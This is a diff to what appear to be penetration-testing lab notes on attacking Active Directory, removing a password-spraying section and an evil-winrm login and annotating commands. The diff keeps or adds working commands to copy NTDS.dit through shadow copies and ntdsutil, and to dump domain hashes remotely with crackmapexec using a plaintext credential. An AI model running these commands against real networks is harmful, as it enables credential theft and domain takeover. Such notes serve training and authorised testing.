@@ -217,24 +217,12 @@ Mimikatz and Pypykatz can extract the DPAPI masterkey for the logged-on user who
 
 ## Attacking Active Directory & NTDS.dit
 
-### Dictionary Attacks against AD accounts using CrackMapExec
-
-```
-./username-anarchy -i /home/ltnbob/names.txt
-
-crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
-## or
-netexec smb 10.129.111.214 -u posi -p passwords2
-```
-
 ### Capturing NTDS.dit
 
 **vssadmin**
 ```powershell
-evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
-
 ## Checking Local Group Membership of Administrators 
-*Evil-WinRM* PS C:\> net localgroup
+net localgroup
 
 ## Creating Shadow Copy of C:
 vssadmin CREATE SHADOW /For=C:
@@ -245,10 +233,14 @@ cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTD
 ```
 **ntdsutil**
 ```powershell
+## Checking Local Group Membership of Administrators 
+net localgroup
+
+## uses ntdsutil.exe to create a full backup of the Active Directory database (NTDS.dit). 
 powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
 ```
 
-### A Faster Method: Using cme to Capture NTDS.dit
+### Capture NTDS.dit Remotely
 ```
 crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
 ```
